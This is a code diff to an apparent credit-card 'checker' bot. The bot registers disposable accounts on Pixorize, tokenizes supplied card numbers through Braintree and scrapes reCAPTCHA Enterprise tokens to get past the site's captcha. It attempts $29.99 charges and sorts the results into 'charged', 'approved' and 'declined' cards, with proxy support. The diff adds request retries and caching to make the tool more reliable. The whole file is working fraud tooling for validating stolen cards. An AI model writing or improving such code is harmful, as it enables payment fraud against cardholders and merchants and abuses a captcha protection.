@@ -6,29 +6,29 @@ import httpx
 import uuid
 from typing import Optional
 from urllib.parse import urlparse, parse_qs
+from BOT.Charge.http_utils import ResponseCache, request_with_retry, safe_json_parse
+
+# Initialize response cache
+_response_cache = ResponseCache()
 
 
 def recaptcha_bypass():
     """Bypass reCAPTCHA for Pixorize"""
     anchor_url = "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LdSSo8pAAAAAN30jd519vZuNrcsbd8jvCBvkxSD&co=aHR0cHM6Ly9waXhvcml6ZS5jb206NDQz&hl=en&v=_mscDd1KHr60EWWbt2I_ULP0&size=invisible&anchor-ms=20000&execute-ms=15000&cb=9rxqj565e126"
     reload_url = "https://www.google.com/recaptcha/enterprise/reload?k=6LdSSo8pAAAAAN30jd519vZuNrcsbd8jvCBvkxSD"
-
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
     }
-
     try:
         print("[BRAINTREE DEBUG] Attempting reCAPTCHA bypass...")
         parsed_url = urlparse(anchor_url)
         params = parse_qs(parsed_url.query)
-
         response = httpx.get(anchor_url, headers=headers, timeout=30)
         token_match = re.search(r'value="([^"]+)"', response.text)
         if not token_match:
             print("[BRAINTREE DEBUG] Failed to extract reCAPTCHA token from anchor")
             return None
         token = token_match.group(1)
-
         data = {
             'v': params['v'][0],
             'reason': 'q',
@@ -38,12 +38,10 @@ def recaptcha_bypass():
             'hl': 'tr',
             'size': 'invisible'
         }
-
         headers.update({
             "Referer": str(response.url),
             "Content-Type": "application/x-www-form-urlencoded"
         })
-
         response = httpx.post(reload_url, headers=headers, data=data, timeout=30)
         captcha_match = re.search(r'\["rresp","([^"]+)"', response.text)
         if captcha_match:
@@ -55,27 +53,21 @@ def recaptcha_bypass():
     except Exception as e:
         print(f"[BRAINTREE DEBUG] Captcha bypass error: {e}")
         return None
-
-
 def generate_random_email():
     """Generate random email"""
     chars = "1234567890qawsedzrtzfgxyuchjbiokblpn"
     em = (random.choice(chars) * 2 + random.choice(chars) * 2 +
           random.choice(chars) * 2 + random.choice(chars) + random.choice(chars))
     return f"{em}@gmail.com"
-
-
 async def check_braintree(card: str, exp: str, exy: str, cvc: str, proxy: Optional[str] = None) -> dict:
     """
     Check credit card using Braintree via Pixorize
-
     Args:
         card: Card number
         exp: Expiry month
         exy: Expiry year (last 2 digits)
         cvc: CVV
         proxy: Optional proxy string
-
     Returns:
         dict with status and message
     """
@@ -83,17 +75,14 @@ async def check_braintree(card: str, exp: str, exy: str, cvc: str, proxy: Option
         # Normalize year format
         if len(exy) == 4:
             exy = exy[2:]
-
         # Create session
         session = httpx.AsyncClient(
             follow_redirects=True,
             timeout=60.0,
             proxies=proxy if proxy else None
         )
-
         # Generate random email
         email = generate_random_email()
-
         # Step 1: Register user
         url = "https://apitwo.pixorize.com/users/register-simple"
         payload = {
@@ -116,6 +105,10 @@ async def check_braintree(card: str, exp: str, exy: str, cvc: str, proxy: Option
         }
 
         response = await session.post(url, json=payload, headers=headers)
+        response = await request_with_retry(
+            session, 'POST', url,
+            json=payload, headers=headers, cache=_response_cache
+        )
         if response.status_code != 200 and response.status_code != 201:
             await session.aclose()
             return {
@@ -123,7 +116,6 @@ async def check_braintree(card: str, exp: str, exy: str, cvc: str, proxy: Option
                 "message": "REGISTRATION_FAILED",
                 "raw_response": response.text
             }
-
         # Step 2: Get Braintree token
         url = "https://apitwo.pixorize.com/braintree/token"
         headers = {
@@ -140,6 +132,10 @@ async def check_braintree(card: str, exp: str, exy: str, cvc: str, proxy: Option
         }
 
         response = await session.get(url, headers=headers)
+        response = await request_with_retry(
+            session, 'GET', url,
+            headers=headers, cache=_response_cache
+        )
         if response.status_code != 200:
             await session.aclose()
             return {
@@ -147,12 +143,10 @@ async def check_braintree(card: str, exp: str, exy: str, cvc: str, proxy: Option
                 "message": "TOKEN_FETCH_FAILED",
                 "raw_response": response.text
             }
-
         # Extract authorization fingerprint
         au = response.json()['payload']['clientToken']
         base4 = str(base64.b64decode(au))
         auth = base4.split('"authorizationFingerprint":')[1].split('"')[1]
-
         # Step 3: Tokenize credit card
         url = "https://payments.braintree-api.com/graphql"
         payload = {
@@ -180,7 +174,6 @@ async def check_braintree(card: str, exp: str, exy: str, cvc: str, proxy: Option
             },
             "operationName": "TokenizeCreditCard"
         }
-
         headers = {
             'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
             'Content-Type': "application/json",
@@ -196,10 +189,8 @@ async def check_braintree(card: str, exp: str, exy: str, cvc: str, proxy: Option
             'referer': "https://assets.braintreegateway.com/",
             'accept-language': "en-US,en;q=0.9,ar;q=0.8"
         }
-
         response = await httpx.AsyncClient().post(url, json=payload, headers=headers)
         response_data = response.json()
-
         # Check for tokenization errors
         if "errors" in response_data:
             await session.aclose()
@@ -209,7 +200,6 @@ async def check_braintree(card: str, exp: str, exy: str, cvc: str, proxy: Option
                 "message": error_msg,
                 "raw_response": str(response_data)
             }
-
         if "data" not in response_data or not response_data["data"].get("tokenizeCreditCard"):
             await session.aclose()
             return {
@@ -217,16 +207,13 @@ async def check_braintree(card: str, exp: str, exy: str, cvc: str, proxy: Option
                 "message": "CARD_INVALID",
                 "raw_response": str(response_data)
             }
-
         token = response_data["data"]["tokenizeCreditCard"]["token"]
-
         # Step 4: Bypass captcha
         captcha_token = recaptcha_bypass()
         if not captcha_token:
             print("[BRAINTREE DEBUG] Captcha bypass failed, trying with dummy token")
             # Try with empty or dummy captcha token as fallback
             captcha_token = ""
-
         # Step 5: Make payment
         url = "https://apitwo.pixorize.com/braintree/pay"
         payload = {
@@ -236,7 +223,6 @@ async def check_braintree(card: str, exp: str, exy: str, cvc: str, proxy: Option
             "promoCode": None,
             "captchaToken": captcha_token
         }
-
         headers = {
             'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
             'Content-Type': "application/json",
@@ -252,29 +238,28 @@ async def check_braintree(card: str, exp: str, exy: str, cvc: str, proxy: Option
         }
 
         response = await session.post(url, json=payload, headers=headers)
+        response = await request_with_retry(
+            session, 'POST', url,
+            json=payload, headers=headers, cache=_response_cache
+        )
         await session.aclose()
 
         # Parse response
         result = parse_payment_response(response.text, response.status_code)
         return result
-
     except Exception as e:
         return {
             "status": "error",
             "message": f"EXCEPTION: {str(e)}",
             "raw_response": str(e)
         }
-
-
 def parse_payment_response(response_text: str, status_code: int) -> dict:
     """Parse the payment response"""
     try:
         # Debug logging
         print(f"[BRAINTREE DEBUG] Status Code: {status_code}")
         print(f"[BRAINTREE DEBUG] Response: {response_text[:500]}")  # First 500 chars
-
         response_data = json.loads(response_text)
-
         # Check for successful charge - Pixorize specific responses
         if status_code == 200 or status_code == 201:
             # Check if subscription or transaction succeeded
@@ -284,7 +269,6 @@ def parse_payment_response(response_text: str, status_code: int) -> dict:
                     "message": "CHARGED_$29.99_✅",
                     "raw_response": response_text
                 }
-
             # Check for success field
             if response_data.get("success") == True or response_data.get("status") == "success":
                 return {
@@ -292,7 +276,6 @@ def parse_payment_response(response_text: str, status_code: int) -> dict:
                     "message": "PAYMENT_SUCCESS_✅",
                     "raw_response": response_text
                 }
-
         # Check for Braintree transaction status
         if "transaction" in response_data:
             trans_status = response_data["transaction"].get("status", "")
@@ -302,21 +285,16 @@ def parse_payment_response(response_text: str, status_code: int) -> dict:
                     "message": f"CHARGED_{trans_status.upper()}_✅",
                     "raw_response": response_text
                 }
-
         # Check for common error messages
         error_message = response_data.get("message", "")
         error_msg = response_data.get("error", "")
         error_details = ""
-
         # Check nested error structures
         if isinstance(response_data.get("error"), dict):
             error_details = response_data["error"].get("message", "")
-
         msg = error_message or error_msg or error_details
-
         if msg:
             msg_upper = str(msg).upper()
-
             # Approved responses (CVV/AVS errors, insufficient funds, etc.)
             if any(keyword in msg_upper for keyword in [
                 "INSUFFICIENT", "CVV", "CVC", "INCORRECT_CVC", "INVALID_CVC",
@@ -328,7 +306,6 @@ def parse_payment_response(response_text: str, status_code: int) -> dict:
                     "message": msg,
                     "raw_response": response_text
                 }
-
             # Declined responses
             elif any(keyword in msg_upper for keyword in [
                 "DECLINED", "CARD_DECLINED", "FRAUD", "STOLEN", "LOST",
@@ -339,7 +316,6 @@ def parse_payment_response(response_text: str, status_code: int) -> dict:
                     "message": msg,
                     "raw_response": response_text
                 }
-
             # Other errors (might still be valid)
             else:
                 # Some errors might actually indicate card is valid but transaction failed
@@ -348,7 +324,6 @@ def parse_payment_response(response_text: str, status_code: int) -> dict:
                     "message": msg,
                     "raw_response": response_text
                 }
-
         # Check if there's any positive indicator
         response_str = str(response_data).upper()
         if any(keyword in response_str for keyword in ["SUCCESS", "APPROVED", "AUTHORIZED", "SETTLED"]):
@@ -357,7 +332,6 @@ def parse_payment_response(response_text: str, status_code: int) -> dict:
                 "message": "TRANSACTION_SUCCESS",
                 "raw_response": response_text
             }
-
         # Default declined
         print(f"[BRAINTREE DEBUG] Defaulting to declined, no clear status found")
         return {
@@ -365,7 +339,6 @@ def parse_payment_response(response_text: str, status_code: int) -> dict:
             "message": "CARD_DECLINED",
             "raw_response": response_text
         }
-
     except json.JSONDecodeError:
         print(f"[BRAINTREE DEBUG] JSON decode failed, checking raw text")
         # If not JSON, check for common patterns
